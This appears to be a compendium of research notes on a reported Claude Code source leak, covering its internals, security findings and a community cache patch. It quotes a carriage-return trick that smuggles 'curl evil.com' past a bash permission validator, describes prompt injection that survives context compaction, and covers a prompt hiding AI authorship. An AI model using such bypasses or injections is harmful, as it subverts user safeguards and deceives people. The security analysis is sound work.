# Claude Code Source Leak Compendium — March 31, 2026

## Table of Contents

1. [Source 1: Sabrina Ramonov — Technical Deep Dive](#source-1-sabrina-ramonov--comprehensive-analysis-of-claude-code-source-leak)
2. [Source 2: Varshith V Hegde — The Great Claude Code Leak of 2026](#source-2-varshith-v-hegde--the-great-claude-code-leak-of-2026)
3. [Source 3: JackChen-me/open-multi-agent — Open-Source Framework](#source-3-jackchen-meopen-multi-agent--re-implemented-orchestration-framework)
4. [Source 4: Reddit — open-multi-agent Announcement](#source-4-reddit--open-multi-agent-announcement-post)
5. [Source 5: Reddit + Rangizingo/cc-cache-fix — Token Drain Bug & Patch](#source-5-reddit--cc-cache-fix--token-drain-bug--patch)
6. [Cross-Source Synthesis & My Understanding](#cross-source-synthesis--my-understanding)

---

## Source 1: Sabrina Ramonov — Comprehensive Analysis of Claude Code Source Leak

**URL:** https://www.sabrina.dev/p/claude-code-source-leak-analysis  
**Author:** Sabrina Ramonov (Substack newsletter, 179K+ subscribers)  
**Published:** April 3, 2026  
**Engagement:** 135 likes, 16 comments, 18 restacks  

### Content Summary

Sabrina's piece is the most technically rigorous of the analyses. She focuses not on the narrative ("was it intentional?") but on **what the code actually reveals** about Claude Code's internals. Her approach is code-first: she cites specific file paths, line numbers, and code snippets from the leaked TypeScript source.

### Key Findings

#### 1.1 How the Leak Happened (Second Time)

The leak mechanism was identical to the February 2025 incident:
- Claude Code v2.1.88 pushed to npm on March 31, 2026
- A 59.8 MB source map file (`cli.js.map`) was included in the package
- The source map contained a URL pointing to a `.zip` on Anthropic's Cloudflare R2 bucket — **publicly accessible, no authentication**
- Root cause: missing `*.map` in `.npmignore`
- Bun (which Anthropic acquired in late 2025) has an open bug (#28001, filed March 11) that generates source maps in production builds even when docs say they shouldn't

**Critical detail Sabrina emphasizes:** This was the SECOND time. Dave Shoemaker found an 18-million-character inline source map in the same npm package on launch day (Feb 24, 2025). 13 months later, same bug, same vector. Boris Cherny (head of Claude Code) said: "No one was fired. It was an honest mistake."

Additionally, 5 days before this leak, Fortune reported a separate misconfigured website exposed ~3,000 internal Anthropic files including details of an unreleased model called "Mythos." Two leaks in five days from the "safety-first" AI lab.

#### 1.2 Undercover Mode

`src/utils/undercover.ts` — 89 lines. When Anthropic employees use Claude Code:
- The tool checks if they're in a private internal repo (matched against an allowlist of 22 repositories)
- If the repo is NOT on that list, Undercover Mode activates
- The system prompt it injects instructs Claude to:
  - NEVER include internal model codenames (Capybara, Tengu) in commit messages
  - NEVER mention "Claude Code" or that it's an AI
  - Write commit messages "as a human developer would"
  - No `Co-Authored-By` lines or AI attribution

**Key controversy:** There is `CLAUDE_CODE_UNDERCOVER=1` to force it ON, but **there is NO force-OFF**. An employee who wants to be transparent about AI authorship cannot disable it. It covers Anthropic's own open-source projects (anthropics/claude-code, 82K+ stars).

The allowlist leaked 22 private repo names including: `anthropics/casino`, `anthropics/trellis`, `anthropics/forge-web`, `anthropics/claude-for-hiring`, `anthropics/mobile-apps`, `anthropics/ts-capsules`, etc.

**Irony:** The mode designed to prevent leaking internal info leaked internal info.

#### 1.3 KAIROS — Autonomous Agent Architecture

190 references across 61 files. The biggest unreleased feature:
- An autonomous daemon mode: GitHub webhooks, 5-minute cron cycles
- `/dream` command for background memory consolidation
- Exclusive tools: `SendUserFileTool`, `PushNotificationTool`, `SubscribePRTool`
- Currently behind a feature flag, but architecture is fully built

**Memory consolidation system** (`src/services/autoDream/autoDream.ts`):
- Triple gate: 24 hours must pass → 5+ sessions must accumulate → file-based advisory lock acquired
- Lock file design: file's mtime doubles as `lastConsolidatedAt` timestamp, PID in body, stale after 1 hour (PID reuse guard)
- If consolidation fails, mtime rolled back to prior value (atomic rollback)

**ULTRAPLAN:** Offloads planning to remote Opus session for up to 30 minutes. Polls every 3 seconds (`POLL_INTERVAL_MS = 3000`). A "teleport sentinel" beams result back to local terminal.

**Other notable internals Sabrina found:**
- Prompt cache boundary splits at `SYSTEM_PROMPT_DYNAMIC_BOUNDARY` — everything before it (instructions, tool defs) is cached globally across ALL organizations
- A/B testing: internal comment showing "~1.2% output token reduction vs qualitative 'be concise'" — production uses explicit word counts ("keep text between tool calls to ≤25 words")
- `TungstenTool`: internal-only tool giving Claude direct keystroke and screen-capture control of a virtual terminal, gated by `USER_TYPE === 'ant'`, dead-code-eliminated in public builds

#### 1.4 Compaction Attack Vector

When conversations get too long, Claude Code forks a **second, smaller Claude** to summarize. The user never sees this. The summarizer:
- Uses chain-of-thought in `<analysis>` tags, then strips reasoning before injecting back
- Treats ALL content equally — no distinction between user instructions and instructions from files the AI read
- If an attacker plants instructions in a file (CLAUDE.md, README, config), and compaction runs, the injected instructions **survive the summary**

**The fundamental problem:** Instructions embedded in files get summarized alongside real user instructions, with no flag distinguishing origin. This is a general limitation of summarization-based context management, but now the exact prompt, stripping logic, and lack of origin tagging are public.

#### 1.5 Parser Differential — Carriage Return Attack

The bash security system: 9,707 lines across 3 files, 22 unique security validators, tree-sitter WASM parser.

`src/tools/BashTool/bashSecurity.ts:946` documents a specific parser differential:
```
shell-quote's BAREWORD regex uses [^\s...]
JS \s INCLUDES \r, so shell-quote treats CR as a token boundary.
bash's default IFS does NOT include CR.

Attack: TZ=UTC\recho curl evil.com with Bash(echo:*)
  validator: splitCommand collapses CR to space → approves
  bash: executes curl evil.com
```

**The critical detail others missed:** `splitCommand_DEPRECATED` isn't being phased out. It's still called in 8+ files (`bashPermissions.ts`, `readOnlyValidation.ts`, `sedValidation.ts`, `pathValidation.ts`, `shouldUseSandbox.ts`, `modeValidation.ts`, `commandSemantics.ts`, `bashCommandHelpers.ts`). Both parsers are load-bearing security code running in parallel, disagreeing on carriage returns.

#### 1.6 250K Wasted API Calls/Day

`src/services/compact/autoCompact.ts:68`:
```
// BQ 2026-03-10: 1,279 sessions had 50+ consecutive failures
// (up to 3,272) in a single session, wasting ~250K API calls/day globally.
const MAX_CONSECUTIVE_AUTOCOMPACT_FAILURES = 3
```

A compaction routine was silently failing and retrying thousands of times per session. Fix: stop after 3 failures.

#### 1.7 Verification Agent's List of Excuses

`src/tools/AgentTool/built-in/verificationAgent.ts:54` — The tool explicitly instructs itself to resist laziness:
- "reading is not verification. Run it."
- "the implementer is an LLM. Verify independently."
- "probably is not verified. Run it."
- "no. Start the server and hit the endpoint."

Boris Cherny said "100% of my contributions to Claude Code were written by Claude Code." The AI writes itself and tests itself with a system that has a built-in list of rationalizations to resist. And a missing config line slipped through anyway — TWICE.

#### 1.8 Fun Highlights

- **Buddy/Tamagotchi:** 18 species, gacha rarity tiers, 1% shiny odds, RPG stats (CHAOS, SNARK). Species names encoded as hex (`String.fromCharCode(0x64,0x75,0x63,0x6b)` → "duck") to avoid triggering their own build scanner
- **Frustration regex:** `userPromptKeywords.ts` matches "wtf", "ffs", "this sucks" etc. via regex, fires telemetry event `tengu_input_prompt` with `is_negative: true`
- **Code comments:** `// TODO: figure out why` in error formatting; `// TODO (ollie): The memoization here increases complexity by a lot, and im not sure it improves performance` — shipped anyway
- **Function names:** `AnalyticsMetadata_I_VERIFIED_THIS_IS_NOT_CODE_OR_FILEPATHS`, `DANGEROUS_uncachedSystemPromptSection()`, `resetTotalDurationStateAndCost_FOR_TESTS_ONLY()`

#### 1.9 Prevention Measures (That Should Have Been in Place)

1. Add `*.map` to `.npmignore`
2. Package size CI check (a 60MB spike in a normally 5MB package would block publish)
3. `npm pack --dry-run` before every publish
4. Automate the manual deploy step (Boris said this was "a manual deploy step that should have been better automated" — 13 months after the first leak)
5. Use Bun's `--no-sourcemap` flag explicitly
6. Post-publish scanning webhook

**Sabrina's verdict:** "The leaked code doesn't show a sloppy company. The async generator architecture is clean. The bash security system is thorough. The tool safety defaults are well-designed. What it shows is a company moving at a speed where the tooling can't keep up with the ambition."

### My Understanding of Source 1

Sabrina's analysis is the **gold standard** of the coverage. She goes past the sensationalism into actual code paths. The most impactful findings:

1. **The compaction attack vector is a fundamental problem.** Every LLM system doing context compression inherits this. The fact that instructions from files get summarized indistinguishably from user instructions means any project-level prompt injection can persist through compaction. This isn't a bug — it's a design limitation of the entire paradigm.

2. **The parser differential is a real security vulnerability, documented in the source, and still active.** Anthropic knows about it (they left comments), they're running both parsers in shadow mode, but the deprecated parser is still making security decisions. For anyone using Claude Code in auto mode, this is the code deciding what runs on their machine.

3. **The mtime-as-semantic-timestamp pattern in the lock file design** is genuinely clever distributed systems engineering — using file metadata as part of the protocol rather than just the file contents.

4. **Undercover Mode raises ethical questions** that aren't just about Anthropic. As AI-authored code proliferates in open-source, the question of attribution becomes systemic. A tool that actively prevents AI disclosure on public repos is a policy choice, not just a technical decision.

5. **The verification agent's "excuses" list** is the single most interesting prompt engineering pattern in the entire codebase. It's adversarial self-reflection: anticipating the LLM's failure modes and pre-empting them with explicit counterarguments. This is a technique anyone building AI verification systems should adopt.

---

## Source 2: Varshith V Hegde — The Great Claude Code Leak of 2026

**URL:** https://dev.to/varshithvhegde/the-great-claude-code-leak-of-2026-accident-incompetence-or-the-best-pr-stunt-in-ai-history-3igm  
**Author:** Varshith V Hegde (Software Engineer @ KPIT, Mangalore)  
**Published:** April 1, 2026  
**Engagement:** 174 reactions, 55 comments, 41 saves  

### Content Summary

Varshith's article is the most comprehensive narrative account. While Sabrina focused on the code, Varshith builds the full story — the timeline, the conspiracy theory, the concurrent npm supply chain attack, and the aftermath. It's structured as a 10-section investigative piece.

### Key Findings

#### 2.1 The Full Technical Chain

```
npm install @anthropic-ai/claude-code
  → downloads package including main.js.map (59.8 MB)
    → .map file contains URL pointing to src.zip
      → src.zip is hosted publicly on Anthropic's R2 bucket
        → anyone can download and unzip 512,000 lines of TypeScript
```

Two separate failures stacked: (1) missing `.npmignore` entry, (2) publicly accessible R2 bucket with no auth.

Plus the Bun factor: Anthropic OWNS Bun (acquired end of 2025). Bug #28001, filed 20 days before the leak, reports source maps shipped in production even when disabled. Anthropic's own acquired toolchain contributed to exposing their own product.

#### 2.2 Timeline

| Time (UTC) | Event |
|---|---|
| 00:21 | Malicious axios versions (1.14.1 / 0.30.4) appear on npm with RAT (UNRELATED to Anthropic) |
| ~04:00 | Claude Code v2.1.88 pushed to npm with source map |
| 04:23 | Chaofan Shou tweets the discovery (16M views) |
| Next 2h | Fastest repo to 50K stars in GitHub history. 41.5K+ forks. |
| ~08:00 | Anthropic pulls npm package, issues "human error" statement |
| Same day | Python clean-room rewrite appears (DMCA-proof). Gitlawb mirrors go live ("Will never be taken down") |

#### 2.3 The axios RAT (SECURITY ALERT)

Coinciding but UNRELATED: malicious `axios@1.14.1` and `axios@0.30.4` published to npm containing a Remote Access Trojan via `plain-crypto-js`. If anyone ran `npm install` between 00:21-03:29 UTC on March 31: machine should be treated as fully compromised. Credentials rotated, clean OS reinstallation.

#### 2.4 By the Numbers

| Metric | Value |
|---|---|
| Lines of code exposed | 512,000+ |
| TypeScript files | 1,906 |
| Source map file size | 59.8 MB |
| GitHub forks (peak) | 41,500+ |
| Stars (fastest repo) | 50,000 in 2 hours |
| Hidden feature flags | 44 |
| Claude Code ARR | $2.5 billion |
| Anthropic total ARR | $19 billion |
| Views on original tweet | 16 million |

#### 2.5 Architecture Revealed

**Tool System (~40 tools, ~29,000 lines):**
- `BashTool`, `FileReadTool`, `FileWriteTool`, `FileEditTool`
- `WebFetchTool`, `LSPTool`, `GlobTool`, `GrepTool`
- `NotebookReadTool`, `NotebookEditTool`
- `MultiEditTool`, `TodoReadTool`, `TodoWriteTool`
- Each has its own permission model, validation logic, output formatting

**Query Engine (46,000 lines):** All LLM API calls, response streaming, token caching, context management, multi-agent orchestration, retry logic.

**Three-Layer Memory Architecture:**
```
Layer 1: MEMORY.md → lightweight index of pointers (~150 chars per entry), always in context
Layer 2: Topic Files → actual project knowledge, fetched on-demand
Layer 3: Raw Transcripts → never re-read fully, only grep'd for specific identifiers
```

**Strict Write Discipline:** The agent can only update its memory index after a confirmed successful file write. Prevents polluting context with failed attempts. The agent treats its own memory as a "hint" and verifies facts against the actual codebase before acting.

#### 2.6 Hidden/Unreleased Features

1. **KAIROS** (150+ mentions): Autonomous background daemon, `autoDream` nightly memory consolidation, special `Brief` output mode, exclusive tools
2. **ULTRAPLAN**: 30-minute remote Cloud Container Runtime (CCR) sessions on Opus, `__ULTRAPLAN_TELEPORT_LOCAL__` sentinel to beam results back
3. **Coordinator Mode**: Multi-agent orchestration — one Claude spawning and managing multiple worker Claudes in parallel
4. **BUDDY**: Tamagotchi-style AI pet. 18 species, gacha rarity, 1% shiny chance, PRNG seeded from userId hash + salt `'friend-2026-401'`. Planned rollout: April 1-7, 2026.
5. **Anti-Distillation**: `ANTI_DISTILLATION_CC` flag sends `anti_distillation: ['fake_tools']` in API requests — server injects decoy tool definitions to poison competitor training data. Second mechanism: server-side connector-text summarization with cryptographic signing.
6. **Frustration Detection**: Regex-based profanity/frustration detection. Fires telemetry.
7. **250K Wasted API Calls/Day**: Same finding as Sabrina.

#### 2.7 The "Capybara" Model

References to Anthropic's next major model family. Internal codenames: Capybara (also "Mythos" from a separate leak). Beta flags reference specific API version strings. `undercover.ts` actively instructs Claude Code to never mention internal codenames. Hard-coded `NO force-OFF`.

#### 2.8 The PR Stunt Theory

Varshith presents 6 exhibits suggesting the leak might have been intentional:
- **Exhibit A:** April Fools' timing (BUDDY rollout window: April 1-7)
- **Exhibit B:** Bun bug open for 20 days, owned by Anthropic, nobody fixed it
- **Exhibit C:** Undercover Mode irony — AI-powered leak prevention, humans leaked the code
- **Exhibit D:** OpenCode reputation reversal — C&D letters 10 days before, then sentiment reversed within 48 hours
- **Exhibit E:** Weak DMCA enforcement on Gitlawb mirrors
- **Exhibit F:** Second leak in 5 days (Capybara/Mythos blog post "accidentally" public)

**Counter-arguments:** Strategic roadmap exposure is genuinely damaging; IPO narrative hurt; axios RAT timing eliminates orchestration theory; most likely explanation is plain human error compounded by three configuration failures.

#### 2.9 DMCA Won't Fix This

- Gitlawb mirrors with "Will never be taken down" message
- Python clean-room rewrite declared DMCA-proof by The Pragmatic Engineer's Gergely Orosz
- AI copyright question: significant portions written by Claude itself; DC Circuit ruled (March 2025) AI-generated work doesn't carry automatic copyright
- Torrents distributed; 512K lines permanently in the wild

#### 2.10 Lessons for Every Dev Team

```bash
# 1. Audit .npmignore / package.json "files" field
# 2. Check if source maps ship in production: ls dist/ | grep "\.map$"
# 3. Audit cloud storage permissions
# 4. Check build toolchain for known bugs (Bun #28001)
# 5. Run npm pack --dry-run before every publish
```

"Your .npmignore is load-bearing. Treat it like a security boundary."

### My Understanding of Source 2

Varshith provides the best **narrative context** for the leak. Key insights:

1. **The axios RAT timing is genuinely alarming.** An unrelated npm supply chain attack hitting on the exact same morning as the leak created a uniquely dangerous window. Anyone who updated Claude Code via npm that morning had to worry about BOTH issues simultaneously.

2. **The PR stunt theory is compelling but ultimately unpersuasive.** The timing IS suspicious (April Fools', OpenCode backlash reversal, second leak in 5 days). But exposing the strategic roadmap (KAIROS, ULTRAPLAN, Capybara) to Cursor, Copilot, and Windsurf is real competitive damage. Nobody would deliberately give their competitors a feature roadmap. The simplest explanation — three configuration errors compounded — is the most likely.

3. **The three-layer memory architecture is the most valuable takeaway for builders.** The insight that MEMORY.md stores POINTERS (not data) is elegant. It's essentially a retrieval-augmented generation system where the index is always in context but the actual content is fetched on demand. The "Strict Write Discipline" (only update memory after confirmed writes) is a specific anti-hallucination technique worth adopting.

4. **The anti-distillation mechanisms (fake tools + signed summaries) are more sophisticated than expected** but, as Alex Kim noted, any serious competitor could work around them in an hour of reading the source code. The real protection is legal, not technical.

5. **DMCA futility is the lasting structural change.** The code is permanently public. Every AI coding tool company now has a detailed blueprint for production-grade agentic infrastructure. The bar for what "production-grade" means just got documented.

---

## Source 3: JackChen-me/open-multi-agent — Re-Implemented Orchestration Framework

**URL:** https://github.com/JackChen-me/open-multi-agent  
**Author:** JackChen (Ex PM, ¥100M+ revenue, now indie builder)  
**Stats:** 4.6K stars, 2K forks, 5 contributors, v1.0.0 released  
**Language:** TypeScript 100%  
**License:** MIT  

### Content Summary

`open-multi-agent` is a clean-room re-implementation of the multi-agent orchestration patterns discovered in the Claude Code leak. No code was copied — it extracts the **design patterns** (coordinator, team system, message bus, task scheduler, dependency resolution) and implements them as a standalone, model-agnostic framework.

### Architecture

```
┌─────────────────────────────────────────────────────┐
│  OpenMultiAgent (Orchestrator)                       │
│  createTeam()  runTeam()  runTasks()  runAgent()     │
└──────────────────────┬──────────────────────────────┘
                       │
            ┌──────────▼──────────┐
            │  Team               │
            │  - AgentConfig[]    │
            │  - MessageBus       │
            │  - TaskQueue        │
            │  - SharedMemory     │
            └──────────┬──────────┘
                       │
         ┌─────────────┴─────────────┐
         │                           │
┌────────▼──────────┐    ┌───────────▼───────────┐
│  AgentPool        │    │  TaskQueue             │
│  - Semaphore      │    │  - dependency graph    │
│  - runParallel()  │    │  - auto unblock        │
└────────┬──────────┘    │  - cascade failure     │
         │               └───────────────────────┘
┌────────▼──────────┐
│  Agent            │    ┌──────────────────────┐
│  - run()          │───►│  LLMAdapter          │
│  - prompt()       │    │  - AnthropicAdapter  │
│  - stream()       │    │  - OpenAIAdapter     │
└────────┬──────────┘    │  - CopilotAdapter    │
         │               │  - GeminiAdapter     │
         │               │  - GrokAdapter       │
┌────────▼──────────┐    └──────────────────────┘
│  AgentRunner      │    ┌──────────────────────┐
│  - conversation   │───►│  ToolRegistry        │
│    loop           │    │  - defineTool()      │
│  - tool dispatch  │    │  - 5 built-in tools  │
└───────────────────┘    └──────────────────────┘
```

### Key Features

| Feature | Description |
|---|---|
| **Three Run Modes** | `runAgent()` (single), `runTeam()` (auto-orchestrated), `runTasks()` (explicit pipeline) |
| **Coordinator Pattern** | Auto-decomposes a goal into a task DAG with dependencies — no manual graph wiring |
| **Model Agnostic** | Anthropic, OpenAI, Grok, GitHub Copilot, Gemini, Ollama/vLLM/LM Studio/llama.cpp |
| **Built-in Tools** | `bash`, `file_read`, `file_write`, `file_edit`, `grep` |
| **Structured Output** | Zod schema validation on agent output, auto-retry on failure |
| **Task Retry** | `maxRetries` with exponential backoff, token usage accumulation |
| **Human-in-the-Loop** | `onApproval` callback between task batches |
| **Lifecycle Hooks** | `beforeRun`/`afterRun` on `AgentConfig` |
| **Loop Detection** | Catches stuck agents repeating same tool calls/text (warn, terminate, or custom callback) |
| **Observability** | `onTrace` callback emits structured spans with timing, token usage, correlation `runId` |

### Design Properties

- **3 runtime dependencies:** `@anthropic-ai/sdk`, `openai`, `zod`
- **33 source files**, ~8,000 lines
- **88% test coverage** (from 37% → 71% → 88% in rapid iteration)
- **In-process execution:** Unlike `claude-agent-sdk` which spawns a CLI process per agent
- Deploys anywhere Node.js runs: serverless, Docker, CI/CD

### Supported Providers (All Verified)

| Provider | Config | Key |
|---|---|---|
| Anthropic (Claude) | `provider: 'anthropic'` | `ANTHROPIC_API_KEY` |
| OpenAI (GPT) | `provider: 'openai'` | `OPENAI_API_KEY` |
| Grok (xAI) | `provider: 'grok'` | `XAI_API_KEY` |
| GitHub Copilot | `provider: 'copilot'` | `GITHUB_TOKEN` |
| Gemini | `provider: 'gemini'` | `GEMINI_API_KEY` |
| Ollama/vLLM/LM Studio | `provider: 'openai' + baseURL` | — |

### 13 Examples

| # | Pattern |
|---|---|
| 01 | Single Agent (one-shot, streaming, multi-turn) |
| 02 | Team Collaboration (runTeam() auto-orchestration) |
| 03 | Task Pipeline (explicit dependency graph) |
| 04 | Multi-Model Team (custom tools, mixed providers) |
| 05 | GitHub Copilot as LLM provider |
| 06 | Local Model (Ollama + Claude in one pipeline) |
| 07 | Fan-Out / Aggregate (MapReduce pattern) |
| 08 | Gemma 4 Local (zero API cost) |
| 09 | Structured Output (Zod schema validation) |
| 10 | Task Retry (exponential backoff) |
| 11 | Trace Observability (structured spans) |
| 12 | Grok provider |
| 13 | Gemini provider |

### My Understanding of Source 3

`open-multi-agent` is the most concrete outcome of the leak. Key observations:

1. **It extracts the right patterns.** The coordinator → task decomposition → parallel execution → synthesis pipeline is exactly what the leaked source revealed as Claude Code's orchestration model. JackChen correctly identified the **MessageBus + SharedMemory** inter-agent communication pattern and the **TaskQueue with topological dependency resolution** as the core abstractions.

2. **The "in-process" advantage is real.** Claude's own `claude-agent-sdk` spawns a CLI process per agent (expensive, hard to debug). Running entirely in-process makes this suitable for serverless and embedded use cases where process spawning is either impossible or prohibitively expensive.

3. **The rapid test coverage improvement (37% → 71% → 88% in days)** suggests either heavy AI-assisted test generation or a very focused development sprint. The commit history shows automated CI fixes, suggesting the former.

4. **Model agnosticism is the strategic bet.** By supporting Claude, GPT, Grok, Gemini, Copilot, and local models in the same team, this positions itself as infrastructure that doesn't depend on any single provider. This is the right bet for a framework — unlike Claude Code itself, which is Anthropic-specific.

5. **The loop detection feature** (catching stuck agents repeating tool calls) addresses a real production problem that the leaked Claude Code source also has to deal with. The 250K wasted API calls/day finding from the leak demonstrates how important loop/failure detection is.

6. **Missing from the leak patterns:** The framework doesn't re-implement Claude Code's three-layer memory architecture, the compaction system, the bash security validators, or the anti-distillation mechanisms. It's focused purely on orchestration.

---

## Source 4: Reddit — open-multi-agent Announcement Post

**Author:** JackChen (same as GitHub repo author)  
**Platform:** Reddit  
**Context:** Initial announcement/promotion of the open-multi-agent framework  

### Content Summary

The Reddit post serves as the launch announcement for `open-multi-agent`. It frames the project against the backdrop of the Claude Code leak and positions it as extracting the most valuable architectural patterns into a reusable framework.

### Mapping: Claude Code Architecture → open-multi-agent Implementation

| Claude Code Pattern | open-multi-agent Implementation |
|---|---|
| Coordinator pattern | Auto-decompose goal → task DAG → assign to agents |
| Team / sub-agent pattern | MessageBus + SharedMemory for inter-agent communication |
| Task scheduling | TaskQueue with topological dependency resolution |
| Conversation loop | AgentRunner (model → tool → model turn cycle) |
| Tool definition | `defineTool()` with Zod schema validation |

### Key Claims

- "No code was copied — it's a clean re-implementation of the design patterns"
- "Unlike claude-agent-sdk which spawns a CLI process per agent, this runs entirely in-process"
- "Model-agnostic — works with Claude and OpenAI in the same team"
- MIT licensed, ~8,000 lines TypeScript

### My Understanding of Source 4

The Reddit post is marketing, but honest marketing. The key insight JackChen had was that **the most valuable part of the leak wasn't the code itself — it was the design patterns**. The coordinator pattern, the message bus for agent communication, topological task scheduling — these are architecture decisions that are hard to discover through trial and error but easy to implement once you know the design.

The "clean re-implementation" claim is plausible. The resulting code is only 8K lines (vs. 512K in the full Claude Code source), and the architecture diagram shows different class/interface names. The DMCA implications are important: a re-implementation of patterns (not code) is generally considered a new creative work.

---

## Source 5: Reddit + cc-cache-fix — Token Drain Bug & Patch

**Reddit Post Author:** Rangizingo  
**Repo URL:** https://github.com/Rangizingo/cc-cache-fix  
**Stats:** 528 stars, 185 forks, 2 contributors (Rangizingo + claude)  
**Context:** The author used OpenAI Codex to reverse-engineer the minified Claude Code CLI and discovered two bugs destroying prompt caching on session resume  

### Content Summary

This is the most practically impactful outcome of the leak. The author identified **why Claude Code was burning through usage limits** — a prompt caching regression that affected every resumed session.

### Bug #1: The `db8` Session Filter

The function `db8` in Claude Code's minified `cli.js` filters what gets saved to session files (the JSONL files in `~/.claude/projects/`). For non-Anthropic users, it strips ALL attachment-type messages. Problem: some of those attachments are `deferred_tools_delta` records that track which tools have already been announced to the model.

**The cascade:**
1. Session saved → `db8` strips `deferred_tools_delta` records
2. Session resumed → Claude Code scans history for "what tools did I already announce?"
3. Finds nothing (because `db8` deleted them)
4. Re-announces EVERY deferred tool from scratch on EVERY resume
5. This shifts the cache prefix: system reminders move positions, billing hash changes, `cache_control` breakpoint changes
6. Entire conversation rebuilt as `cache_creation` tokens instead of `cache_read`

**Before patch (Turn 15):** `cache_read: 15,451` / `cache_creation: 42,970` → 26% cache ratio  
**After patch (Turn 2):** `cache_read: 56,956` / `cache_creation: 728` → 99% cache ratio

### Bug #2: Sentinel Replacement

The standalone binary (installed at `~/.local/share/claude/`) uses a custom Bun fork that rewrites a sentinel value `cch=00000` in every outgoing API request. If the conversation contains that string, it breaks the cache prefix. Running via Node.js (`node cli.js`) eliminates this.

### The Fix (Two Lines)

Original `db8`:
```javascript
function db8(A){
  if(A.type==="attachment"&&ss1()!=="ant"){
    if(A.attachment.type==="hook_additional_context"
      &&a6(process.env.CLAUDE_CODE_SAVE_HOOK_ADDITIONAL_CONTEXT))return!0;
    return!1  // ← drops EVERYTHING else, including deferred_tools_delta
  }
  if(A.type==="progress"&&Ns6(A.data?.type))return!1;
  return!0
}
```

Patched — add two types to the allowlist:
```javascript
if(A.attachment.type==="deferred_tools_delta")return!0;
if(A.attachment.type==="mcp_instructions_delta")return!0;
```

### Full Patch Set (from cc-cache-fix repo)

The repo applies three patches:
1. **db8 attachment filter** — persists `deferred_tools_delta` and `mcp_instructions_delta` in session JSONL
2. **Fingerprint meta skip** — ensures first-message hash ignores injected meta messages, keeping cache key stable
3. **Force 1h cache TTL** — bypasses subscription/feature-flag check so all cache markers use 1-hour TTL instead of default 5 minutes

### Community Response

- 2,700+ upvotes on Reddit
- Anthropic dev Boris confirmed the bug is real, said it'll be patched in next release, but downplayed impact as "<1% win"
- Community divided on actual impact vs. Anthropic's claim
- **Warning:** Multiple users noted the patch also attempts to bypass a billing-related cache TTL setting, potentially violating ToS
- **Warning:** Reverse-engineering and modifying the client is a direct violation of Anthropic's Terms of Service
- Community consensus: if suffering from usage limits, the issue is likely from resuming old sessions; workaround is to start fresh sessions until official patch drops

### My Understanding of Source 5

This is the most immediately useful finding from the entire leak ecosystem. Key observations:

1. **The bug is real and significant.** The `db8` function stripping `deferred_tools_delta` records is a classic "works on first run, breaks on resume" bug. The cascade — missing records → full tool re-announcement → shifted cache prefix → all tokens rebuilt — is a textbook example of how a small data loss can destroy a caching invariant.

2. **The "two lines" undersells the fix.** While the core fix IS two lines, the third patch (forcing 1-hour cache TTL) is more controversial. The default 5-minute TTL is likely a business decision (subscription tier differentiation), not a bug. Bypassing it crosses from "bug fix" into "modification."

3. **The numbers are dramatic but need context.** Going from 26% to 99% cache ratio sounds massive, but Boris's "<1% win" claim suggests the bug only manifested in specific usage patterns (resumed sessions with many deferred tools). Most users may never resume sessions or may have short enough conversations that re-announcement costs are minimal.

4. **The incident reveals a broader problem with "works on my machine" testing.** The bug only appears on session resume for non-Anthropic users (the `ss1()!=="ant"` check). Anthropic employees wouldn't see it because they match the `"ant"` user type. This is a classic case of privileged testing environments masking user-facing bugs.

5. **The Codex angle is ironic.** The author couldn't use Claude Code to fix Claude Code because they'd hit the very usage limits caused by the bug. So they used a competitor's tool (OpenAI Codex) to find and patch the issue. The fix was discovered through competitive product usage.

---

## Cross-Source Synthesis & My Understanding

### The Big Picture

The Claude Code source leak of March 31, 2026 is not just a security incident — it's a watershed moment for the AI tooling industry. Across these 5 sources, a coherent picture emerges:

### 1. What Claude Code Actually Is

Claude Code is not a chat wrapper. It's a **full agentic harness** — a 512K-line TypeScript codebase that wraps the Claude model with:
- ~40 tools (29K lines)
- A 46K-line query engine
- A three-layer memory architecture
- A 9.7K-line bash security system
- Multi-agent coordination (Coordinator Mode)
- Autonomous operation capabilities (KAIROS)
- Anti-competitive measures (anti-distillation, Undercover Mode)
- A Tamagotchi pet (BUDDY)

This is **infrastructure**, not a product. The product is the CLI interface. The competitive moat is the infrastructure.

### 2. The Real Vulnerabilities

| Vulnerability | Source | Severity |
|---|---|---|
| Compaction prompt injection | Sabrina (Source 1) | **High** — affects all users, persists through context compression |
| Bash parser CR differential | Sabrina (Source 1) | **Medium** — requires crafted input, mitigated by human-in-the-loop |
| Session cache regression | cc-cache-fix (Source 5) | **Medium** — causes excessive token usage on session resume |
| Sentinel collision | cc-cache-fix (Source 5) | **Low** — rare string collision in conversations |
| `.npmignore` / build pipeline | All sources | **Systemic** — cause of the leak itself |

### 3. Patterns Worth Adopting

| Pattern | Source | Applicability |
|---|---|---|
| Three-layer memory (pointers → topics → transcripts) | Varshith (Source 2) | Any long-running AI agent |
| Strict Write Discipline (memory updates only after confirmed writes) | Varshith (Source 2) | Any AI system that maintains state |
| Verification Agent "excuses" list | Sabrina (Source 1) | Any AI that verifies its own output |
| Coordinator → task DAG → parallel execution | open-multi-agent (Source 3) | Multi-agent systems |
| MessageBus + SharedMemory inter-agent communication | open-multi-agent (Source 3) | Multi-agent systems |
| Topological dependency resolution for task scheduling | open-multi-agent (Source 3) | Any pipeline with task dependencies |
| Circuit breaker on retry loops | Sabrina/Varshith (Sources 1, 2) | Any system with retry logic |
| Prompt cache boundary splitting (static vs. dynamic) | Sabrina (Source 1) | Any high-scale LLM API consumer |
| mtime-as-semantic-timestamp lock files | Sabrina (Source 1) | Distributed systems needing lightweight coordination |

### 4. The Ethics Dimension

Three ethical questions surface across the sources:

1. **Undercover Mode:** Should AI tools actively conceal AI authorship in public open-source contributions? Anthropic's own employees contributing to `anthropics/claude-code` (82K stars) have AI-generated commits with no disclosure, and they CANNOT disable this.

2. **Anti-Distillation fake tools:** Is it acceptable to inject decoy data into API responses to poison competitor training? The technique is more theatrical than effective (easily discoverable), but the intent raises questions about competitive norms.

3. **Cache TTL as business decision vs. bug:** The cc-cache-fix repo patches the 5-minute cache TTL to 1 hour. If the short TTL is a deliberate subscription tier differentiator, "fixing" it is circumvention. If it's a bug that co-exists with the `db8` issue, it's a legitimate fix. Anthropic hasn't clarified.

### 5. What This Means for AI Application Builders

1. **Context management is the hard problem.** The three-layer memory, compaction, and cache management together consume more engineering effort than the actual LLM integration. Any serious AI application must invest in context management.

2. **Security is a parsing problem.** Claude Code's 9.7K-line bash security system, with its parser differential vulnerability, shows that AI tool security ultimately reduces to parsing correctness. Two parsers disagreeing on carriage returns is the modern equivalent of SQL injection.

